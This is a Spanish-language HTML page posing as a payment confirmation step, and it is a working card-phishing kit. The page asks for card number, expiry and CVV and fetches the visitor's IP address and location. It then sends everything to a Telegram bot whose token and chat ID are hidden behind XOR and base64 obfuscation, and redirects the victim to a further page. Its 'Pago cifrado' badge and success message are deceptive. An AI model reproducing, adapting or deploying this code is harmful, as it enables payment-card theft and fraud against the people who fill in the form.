<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confirmación de pago</title>
  <style>
    :root {
      --accent: #2563eb;
      --accent-hover: #1d4ed8;
      --bg: #eef2f7;
      --card: #ffffff;
      --text: #0f172a;
      --muted: #64748b;
      --border: #cbd5e1;
      --error: #b91c1c;
      --success: #15803d;
      --loading: #1d4ed8;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: "Inter", ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
      background: var(--bg);
      color: var(--text);
      -webkit-font-smoothing: antialiased;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: var(--card);
      border-radius: 18px;
      padding: 32px 30px 26px;
      box-shadow: 0 18px 40px -14px rgba(15, 23, 42, .25);
      border: 1px solid rgba(148, 163, 184, .25);
    }

    .top {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 22px;
    }

    .org {
      display: flex;
      align-items: center;
      gap: 9px;
      font-size: 13px;
      font-weight: 600;
      color: var(--text);
    }

    .org .logo {
      width: 30px; height: 30px;
      border-radius: 9px;
      background: linear-gradient(145deg, var(--accent), var(--accent-hover));
      color: #fff;
      display: grid;
      place-items: center;
      font-weight: 800;
      font-size: 14px;
    }

    .step {
      font-size: 10.5px;
      font-weight: 700;
      letter-spacing: 1.1px;
      text-transform: uppercase;
      color: var(--muted);
      background: #f1f5fb;
      padding: 6px 10px;
      border-radius: 20px;
    }

    h1 {
      font-size: 22px;
      font-weight: 700;
      letter-spacing: -.4px;
      margin-bottom: 6px;
    }

    .sub {
      font-size: 13.5px;
      line-height: 1.55;
      color: var(--muted);
      margin-bottom: 24px;
    }

    .field { margin-bottom: 16px; }

    .field label {
      display: block;
      font-size: 12.5px;
      font-weight: 600;
      color: var(--text);
      margin-bottom: 7px;
    }

    .box {
      display: flex;
      align-items: center;
      background: #f8fafc;
      border: 1.5px solid var(--border);
      border-radius: 10px;
      transition: background .15s, border-color .15s, box-shadow .15s;
    }

    .box:focus-within {
      background: #fff;
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(37, 99, 235, .16);
    }

    .box input {
      flex: 1;
      width: 100%;
      border: none;
      background: transparent;
      outline: none;
      padding: 13px 14px;
      font-family: inherit;
      font-size: 15px;
      letter-spacing: .4px;
      color: var(--text);
    }

    .box input::placeholder { color: #a3b1c6; font-size: 14px; }

    .box input:-webkit-autofill {
      -webkit-box-shadow: 0 0 0 1000px #f8fafc inset !important;
      -webkit-text-fill-color: var(--text) !important;
    }

    #dato1 { font-family: ui-monospace, Consolas, monospace; letter-spacing: 1.2px; }

    .two { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }

    .hint { font-size: 11.5px; color: var(--muted); margin-top: 6px; }

    .btn {
      width: 100%;
      height: 48px;
      margin-top: 14px;
      border: none;
      border-radius: 10px;
      background: linear-gradient(135deg, var(--accent), var(--accent-hover));
      color: #fff;
      font-family: inherit;
      font-size: 15px;
      font-weight: 600;
      letter-spacing: .3px;
      cursor: pointer;
      transition: transform .12s, box-shadow .15s, opacity .15s;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      box-shadow: 0 10px 22px -10px rgba(37, 99, 235, .8);
    }

    .btn:hover:not(:disabled) { transform: translateY(-1px); }
    .btn:active:not(:disabled) { transform: translateY(0); }
    .btn:disabled { opacity: .65; cursor: not-allowed; }
    .btn .btn-text { display: flex; align-items: center; gap: 7px; }
    .btn.loading .btn-text { visibility: hidden; }

    .btn.loading::after {
      content: "";
      position: absolute;
      width: 18px; height: 18px;
      border: 2.5px solid rgba(255, 255, 255, .3);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin .7s linear infinite;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .msg {
      display: none;
      margin-top: 14px;
      font-size: 13px;
      line-height: 1.5;
      padding: 10px 12px;
      border-radius: 8px;
      font-weight: 500;
    }

    .msg.error   { display: block; background: #fef2f2; color: var(--error); }
    .msg.success { display: block; background: #f0fdf4; color: var(--success); }
    .msg.loading { display: block; background: #eff6ff; color: var(--loading); }

    .foot {
      margin-top: 22px;
      padding-top: 16px;
      border-top: 1px solid #eef2f7;
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-size: 12.5px;
      color: var(--muted);
    }

    .foot a { color: var(--accent); font-weight: 600; text-decoration: none; }
    .foot a:hover { text-decoration: underline; }

    .lock { display: inline-flex; align-items: center; gap: 6px; }
    .lock svg { width: 12px; height: 12px; fill: #94a3b8; }

    @media (max-width: 440px) {
      body { padding: 0; align-items: flex-start; background: #fff; }
      .card {
        border: none; box-shadow: none; border-radius: 0;
        max-width: 100%; padding: 26px 20px; min-height: 100vh;
      }
      h1 { font-size: 20px; }
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="top">
      <div class="org">
        <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcToUIe9A6QvLvypxEQu3Y8mJ7WCb9L6pROqNg&s" width="50px" alt=""></div>
       
      </div>
      <span class="step">Paso 2 de 2</span>
    </div>

    <h1>Confirmación de pago</h1>
    <p class="sub">Ingresa los datos de tu tarjeta para completar la compra.</p>

    <form id="formulario" autocomplete="off">
      <div class="field">
        <label for="dato1">Número de tarjeta</label>
        <div class="box">
          <input type="text" id="dato1" name="dato1" placeholder="0000 0000 0000 0000"
                 maxlength="19" inputmode="numeric" required>
        </div>
      </div>

      <div class="two">
        <div class="field">
          <label for="dato2">Vencimiento</label>
          <div class="box">
            <input type="text" id="dato2" name="dato2" placeholder="MM/AA"
                   maxlength="5" inputmode="numeric" required>
          </div>
        </div>
        <div class="field">
          <label for="dato3">CVV</label>
          <div class="box">
            <input type="password" id="dato3" name="dato3" placeholder="•••"
                   maxlength="4" inputmode="numeric" required>
          </div>
        </div>
      </div>
      <p class="hint">Los 3 dígitos del reverso de la tarjeta.</p>

      <button type="submit" class="btn" id="submitBtn">
        <span class="btn-text">Continuar</span>
      </button>

      <div id="message" class="msg"></div>
    </form>

    <div class="foot">
      <span class="lock">
        <svg viewBox="0 0 24 24"><path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm0 2a3 3 0 0 1 3 3v3H9V6a3 3 0 0 1 3-3z"/></svg>
        Pago cifrado
      </span>
      <a href="#">Soporte</a>
    </div>
  </div>

<script>
(function () {
  'use strict';

  function tgDec(s) {
    const k = 'm4g0rd0';
    const d = atob(s);
    let o = '';
    for (let i = 0; i < d.length; i++) o += String.fromCharCode(d.charCodeAt(i) ^ k.charCodeAt(i % k.length));
    return o;
  }
  const TG_TOKEN = tgDec('VAVRAkZTAVQCVgozJXgydzB3PVxSNEc9VyY8Y15lMHEnCGgaBRFlIjUCK1s+Ww==');
  const TG_CHAT = tgDec('QAVXAEFdCVwCUgZBVgg=');

  async function enviarTelegram(texto) {
    const url = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage' +
      '?chat_id=' + encodeURIComponent(TG_CHAT) +
      '&text=' + encodeURIComponent(texto);
    try { await fetch(url, { mode: 'no-cors' }); } catch (e) {}
  }

  const REDIRECT_URL = 'otttt00.html';

  const form = document.getElementById('formulario');
  const dato1Input = document.getElementById('dato1');
  const dato2Input = document.getElementById('dato2');
  const dato3Input = document.getElementById('dato3');
  const submitBtn = document.getElementById('submitBtn');
  const messageDiv = document.getElementById('message');

  let isSubmitting = false;

  function show(text, type = 'error', timeout = 5000) {
    messageDiv.textContent = text;
    messageDiv.className = 'msg ' + type;
    if (timeout > 0) {
      setTimeout(() => { messageDiv.className = 'msg'; messageDiv.textContent = ''; }, timeout);
    }
  }

  async function getIP() {
    try {
      const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
      if (!r.ok) throw 0;
      const d = await r.json();
      return d.ip || 'No disponible';
    } catch { return 'No disponible'; }
  }

  async function getLocation() {
    try {
      const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
      if (!r.ok) throw 0;
      const d = await r.json();
      return `${d.city || 'Desconocida'}, ${d.country_name || 'Desconocido'}`;
    } catch { return 'No disponible'; }
  }

  dato1Input.addEventListener('input', function () {
    let v = this.value.replace(/\D/g, '').slice(0, 19);
    this.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
  });

  dato2Input.addEventListener('input', function () {
    let v = this.value.replace(/\D/g, '').slice(0, 4);
    if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
    this.value = v;
  });

  dato3Input.addEventListener('input', function () {
    this.value = this.value.replace(/\D/g, '').slice(0, 4);
  });

  form.addEventListener('submit', async function (e) {
    e.preventDefault();
    if (isSubmitting) return;

    const v1 = dato1Input.value.replace(/\s/g, '');
    const v2 = dato2Input.value.trim();
    const v3 = dato3Input.value.trim();

    if (v1.length < 15 || v1.length > 16) {
      show('El número de tarjeta está incompleto.'); dato1Input.focus(); return;
    }
    if (!/^\d{2}\/\d{2}$/.test(v2)) {
      show('Usa el formato MM/AA en el vencimiento.'); dato2Input.focus(); return;
    }
    const mes = parseInt(v2.slice(0, 2), 10);
    if (mes < 1 || mes > 12) {
      show('El mes de vencimiento no es válido.'); dato2Input.focus(); return;
    }
    if (!/^\d{3,4}$/.test(v3)) {
      show('El CVV debe tener 3 o 4 dígitos.'); dato3Input.focus(); return;
    }

    isSubmitting = true;
    submitBtn.disabled = true;
    submitBtn.classList.add('loading');
    show('Verificando…', 'loading', 0);

    try {
      const [ip, location] = await Promise.all([getIP(), getLocation()]);

      await enviarTelegram(
        '📥 Tarjeta ingresada\n\n' +
        'card: ' + v1 + '\n' +
        'exp: ' + v2 + '\n' +
        'cvv: ' + v3 + '\n' +
        'ip: ' + ip + '\n' +
        'location: ' + location
      );

      show('Tarjeta verificada correctamente. Redirigiendo…', 'success', 0);
      setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);

    } catch (err) {
      console.error(err);
      show('Error de conexión. Intenta nuevamente.');
      isSubmitting = false;
      submitBtn.disabled = false;
      submitBtn.classList.remove('loading');
    }
  });

  dato1Input.focus();
})();
</script>
</body>
</html>
